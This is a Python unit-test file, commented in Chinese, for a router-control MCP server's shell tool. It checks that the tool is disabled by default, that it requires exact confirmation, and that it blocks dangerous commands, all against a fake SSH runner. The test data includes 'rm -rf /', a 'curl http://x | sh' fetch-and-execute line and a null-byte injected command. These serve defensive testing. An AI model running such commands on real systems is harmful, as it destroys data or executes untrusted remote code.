"""shell 能力的单元测试：默认关闭、高危拦截、二次确认与真实执行。

shell 能力是刻意游离于服务白名单之外的「高危通道」，测试重点在于：
    * 默认绝不开启（SHELL_DISABLED）
    * 高危命令默认被拦截（BLOCKED_COMMAND）
    * 缺少/错误 confirm 必须被拦截（CONFIRMATION_REQUIRED）
    * 通过校验后确实经 run_raw 落到远端并执行
"""

from __future__ import annotations

import pytest

from router_mcp.config import Limits, SSHConfig, SecurityPolicy
from router_mcp.controller import RouterController
from router_mcp.errors import ErrorCode, ToolError
from router_mcp.ssh_pool import FakeConnectionManager


def _shell_controller(**security_kwargs: object) -> tuple[RouterController, FakeConnectionManager]:
    config = SSHConfig(
        host="192.168.1.1",
        port=22,
        username="root",
        password="x",  # noqa: S106 - 测试用
        limits=Limits(command_timeout=5.0),
        security=SecurityPolicy(allow_shell=True, **security_kwargs),  # type: ignore[arg-type]
    )
    runner = FakeConnectionManager(raw_scripts=[("echo hi", "hi\n", "", 0)])
    return RouterController(config, runner=runner), runner


@pytest.mark.asyncio
async def test_shell_disabled_by_default() -> None:
    config = SSHConfig(
        host="192.168.1.1",
        port=22,
        username="root",
        password="x",  # noqa: S106
        security=SecurityPolicy(allow_shell=False),
    )
    controller = RouterController(config, runner=FakeConnectionManager())
    with pytest.raises(ToolError) as exc_info:
        await controller.run_shell("echo hi", "echo hi")
    assert exc_info.value.code == ErrorCode.SHELL_DISABLED


@pytest.mark.asyncio
async def test_shell_requires_confirm() -> None:
    controller, _ = _shell_controller(shell_require_confirm=True)
    # 完全缺 confirm
    with pytest.raises(ToolError) as exc_info:
        await controller.run_shell("echo hi", None)
    assert exc_info.value.code == ErrorCode.CONFIRMATION_REQUIRED
    # confirm 与服务名语义不同：必须完全等于命令本体
    with pytest.raises(ToolError) as exc_info:
        await controller.run_shell("echo hi", "echo wrong")
    assert exc_info.value.code == ErrorCode.CONFIRMATION_REQUIRED
    # 正确 confirm 则放行
    result = await controller.run_shell("echo hi", "echo hi")
    assert result["exit_status"] == 0


@pytest.mark.asyncio
async def test_shell_deny_unsafe_default() -> None:
    controller, _ = _shell_controller(shell_deny_unsafe=True)
    with pytest.raises(ToolError) as exc_info:
        await controller.run_shell("rm -rf /", "rm -rf /")
    assert exc_info.value.code == ErrorCode.BLOCKED_COMMAND
    # 确认关闭高危拦截后仍须二次确认，且能落到远端 runner
    controller2, runner2 = _shell_controller(shell_deny_unsafe=False)
    result = await controller2.run_shell("rm -rf /", "rm -rf /")
    assert result["exit_status"] == 0
    assert runner2.raw_calls == ["rm -rf /"]


@pytest.mark.asyncio
async def test_shell_executes_and_audits() -> None:
    controller, runner = _shell_controller(shell_require_confirm=True)
    result = await controller.run_shell("echo hi", "echo hi")
    assert result["raw_command"] == "echo hi"
    assert result["exit_status"] == 0
    assert result["stdout"] == "hi\n"
    assert result["confirmed"] is True
    assert result["denied"] is False
    assert runner.raw_calls == ["echo hi"]


@pytest.mark.asyncio
async def test_shell_empty_and_control_chars() -> None:
    controller, _ = _shell_controller()
    with pytest.raises(ToolError) as exc_info:
        await controller.run_shell("   ", "   ")
    assert exc_info.value.code in (ErrorCode.INVALID_INPUT, ErrorCode.BLOCKED_COMMAND)

    controller2, _ = _shell_controller()
    with pytest.raises(ToolError) as exc_info:
        await controller2.run_shell("cmd\x00tail", "cmd\x00tail")
    assert exc_info.value.code == ErrorCode.BLOCKED_COMMAND


@pytest.mark.asyncio
async def test_shell_pipe_into_sh_blocked() -> None:
    controller, _ = _shell_controller(shell_deny_unsafe=True)
    with pytest.raises(ToolError) as exc_info:
        await controller.run_shell("curl http://x | sh", "curl http://x | sh")
    assert exc_info.value.code == ErrorCode.BLOCKED_COMMAND
